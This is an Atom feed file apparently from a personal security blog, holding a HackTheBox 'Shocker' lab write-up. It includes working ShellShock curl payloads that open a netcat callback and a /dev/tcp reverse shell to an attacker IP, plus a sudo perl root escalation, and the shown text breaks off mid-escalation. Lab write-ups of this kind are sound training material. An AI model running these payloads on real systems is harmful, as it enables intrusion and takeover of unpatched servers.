@@ -1,0 +1,269 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-07-13T22:45:28-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Brad’s Blog</title><subtitle>Offensive Security Aficionado &amp;#x7C; Husband &amp;#x7C; Puppy Herder &amp;#x7C; Snake Charmer</subtitle><author><name>Brad Roberts</name></author><entry><title type="html">Shocker</title><link href="http://localhost:4000/hackthebox/2021/07/07/shocker.html" rel="alternate" type="text/html" title="Shocker" /><published>2021-07-07T00:00:00-05:00</published><updated>2021-07-07T00:00:00-05:00</updated><id>http://localhost:4000/hackthebox/2021/07/07/shocker</id><content type="html" xml:base="http://localhost:4000/hackthebox/2021/07/07/shocker.html">&lt;p&gt;Difficulty: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Easy&lt;/code&gt;&lt;br /&gt;
+Operating System: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linux&lt;/code&gt;&lt;br /&gt;
+IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.56&lt;/code&gt;&lt;br /&gt;
+Exploit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ShellShock&lt;/code&gt;&lt;br /&gt;
+Escalation: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /usr/bin/perl&lt;/code&gt; &lt;br /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Alright! Welcome to my first writeup, ShellShock was the first vulnerability I ever exploited outside of Metasploit! So this box is super special to me. Since I’m pretty familiar with this kind of vulnerability, let’s do this entire box using ONLY the command line!
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Let’s begin with a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; see if responds to ICMP:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ping 10.10.10.56
+PING 10.10.10.56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.56&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.56: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;31.9 ms
+64 bytes from 10.10.10.56: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;32.6 ms
+64 bytes from 10.10.10.56: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;32.5 ms
+^C
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.56 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+3 packets transmitted, 3 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;2003ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 31.864/32.323/32.616/0.328 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nice! Let’s go ahead and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; and see what ports are open:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--max-retries&lt;/span&gt; 1 10.10.10.56                                            
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-06 21:35 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.56
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.082s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;12.96 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I used a few &lt;em&gt;interesting&lt;/em&gt; flags in that:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt;: specifies that I want &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to run against all ports (except 0…)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--max-retries 1&lt;/code&gt;: Caps the number of port scan probe retransmissions - meaning it’ll only attempt to connect to a port 2 times, 1 for initial hit, and 1 retry. This just makes the scan run faster… However, we have the potential to still miss ports.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Okay so we found port 80 and 2222 are open, I’m going to target the webpage first (port 80). First thing’s first, let’s fuzz common web directories and see what we’re looking at. To do this, I’ll be using a new tool I found, &lt;a href=&quot;https://github.com/epi052/feroxbuster&quot;&gt;Feroxbuster&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;feroxbuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.56:80/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; sh bash php &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 200 204 301 
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | /  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;    /  &lt;span class=&quot;se&quot;&gt;\ \_&lt;/span&gt;/ | |  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|__
+|    |___ |  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/ / &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |__/ |___
+by Ben &lt;span class=&quot;s2&quot;&gt;&quot;epi&quot;&lt;/span&gt; Risher 🤓                 ver: 2.3.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.56:80/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
+ 👌  Status Codes          │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200, 204, 301]
+ 💥  Timeout &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sh, bash, php]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+200        9l       13w      137c http://10.10.10.56/index.html
+200        7l       18w        0c http://10.10.10.56/cgi-bin/user.sh
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;####################] - 23s   112464/112464  0s      found:2       errors:0      &lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;####################] - 20s    18744/18744   931/s   http://10.10.10.56:80/&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;####################] - 19s    18744/18744   939/s   http://10.10.10.56/cgi-bin/&lt;/span&gt;
+                      
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We found an interesting page: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/user.sh&lt;/code&gt;. A quick curl reveals the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://10.10.10.56/cgi-bin/user.sh                                                                                                                                                                                               1 ⨯
+Content-Type: text/plain
+
+Just an &lt;span class=&quot;nb&quot;&gt;uptime test &lt;/span&gt;script
+
+ 23:09:28 up  1:04,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Good rule of thumb with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/[page].sh&lt;/code&gt; is to check for ShellShock. We can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http-shellshock.nse&lt;/code&gt; script with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to test for ShellShock.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-shellshock.nse &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/cgi-bin/user.sh 10.10.10.56
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-06 21:37 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.56
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.041s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Exploitable&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known
+|       as Shellshock. It seems the server is executing commands injected
+|       via malicious HTTP headers.
+|             
+|     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2014-09-24
+|     References:
+|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+|       http://seclists.org/oss-sec/2014/q3/685
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2014-7169
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2014-6271
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.88 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well look at that, it reports vulnerable! (imagine my shock - pun 100% intended)&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Alright, let’s just double-check and see if we can manually inject code.&lt;/p&gt;
+
+&lt;p&gt;First we’ll start a netcat listener using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 12345&lt;/code&gt;, then we’ll execute the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo BRADMAN | nc 10.10.16.192 12345'&quot;&lt;/span&gt; http://10.10.10.56/cgi-bin/user.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Okay, okay, slow down, what the hell did I just do?&lt;/p&gt;
+
+&lt;p&gt;Let’s start at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 12345&lt;/code&gt;, this is going to open up a &lt;strong&gt;network listener&lt;/strong&gt; on our local machine on port 12345, meaning we are opening up that port and reporting back any connection information sent to it. We do this with the flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lnvp&lt;/code&gt;:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l&lt;/code&gt;: Listener mode for inbound connects&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt;: numeric IP Addresses only, no dns&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt;: verbose mode&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p PORT&lt;/code&gt;: the port we’re wanting to open up, in this case: 12345&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;NetCat is pretty cool and lets us just string all these flags together as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lnvp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-nvlp&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-vlnp&lt;/code&gt; or … well… you should get the idea.&lt;/p&gt;
+
+&lt;p&gt;Next, we need to actually exploit ShellShock - there are super good explanations online for ShellShock, one of my favorites is &lt;a href=&quot;https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=5ee60f4e-030f-4691-b5b4-dc3c9e3701d4&amp;amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;amp;tab=librarydocuments&quot;&gt;here.&lt;/a&gt; I recommend reading through that if you’re unfamiliar with ShellShock.&lt;/p&gt;
+
+&lt;p&gt;So, my actual payload in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; command is&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash -c 'echo BRADMAN | nc 10.10.16.192 12345'&lt;/code&gt; &lt;br /&gt;
+ What this does &lt;strong&gt;echo&lt;/strong&gt;’s “BRADMAN” to netcat, but instead of listening, we’re actually connecting to an IP Address, specifically, my attacker box, and on the port we opened, 12345. When we execute this curl command, we get the following on our netcat listener:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 12345  
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 12345 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.192] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.56] 48194
+BRADMAN
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;NICE! We were not only able to execute code on the target machine, but actually send a message &lt;em&gt;back&lt;/em&gt; to our attacker machine! Alright, let’s see if we can get a fully interactive reverse shell. We’ll try to get a /dev/tcp reverse shell using the following:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.192/12345 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;br /&gt;
+If this works, we should expect to get a fully interactive reverse shell back on our netcat listener (we’ll have to restart our netcat listener).&lt;/p&gt;
+
+&lt;p&gt;Exploit:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.192/12345 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; http://10.10.10.56/cgi-bin/user.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Shell:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/Shocker]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 12345                                                        130 ⨯
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 12345 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.192] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.56] 48196
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shelly&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shelly&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shelly&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,110&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lxd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,115&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,116&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;escalation&quot;&gt;Escalation&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;VERY NICE! Okay, we are now controlling the target machine as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shelly&lt;/code&gt; whomever that is… Let’s look around and see if we can escalate our privileges to root.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;shelly on Shocker:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User shelly may run the following commands on Shocker:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/perl
+shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First thing I always check is what can the current user run as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; but without a password. To do this, we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, if we’re prompted for a password and we don’t know it, then we’re out of luck…. however, we’re not out of luck here! We are able to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/perl&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; without the need of a password. Huh, a programming language that we can run as root - I wonder whatever we’ll be able to do with that? Maybe, tell it to start a new shell?&lt;/p&gt;
+
+&lt;p&gt;Yup! If you don’t know immediately what to do, don’t worry about it, let’s go to &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; and look up perl to see if it has anything. If we search &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl&lt;/code&gt; we can see that we can run a myriad of things, the one we’re most interested in is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;. According to GTFOBins, we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo perl -e 'exec &quot;/bin/sh&quot;;'&lt;/code&gt; and get a shell.. However, look at the results of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and you’ll see that we need a TINY adjustment, we just need to specify the full path of perl. Easy enough:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/bash&quot;;'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/bash&quot;;'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;id
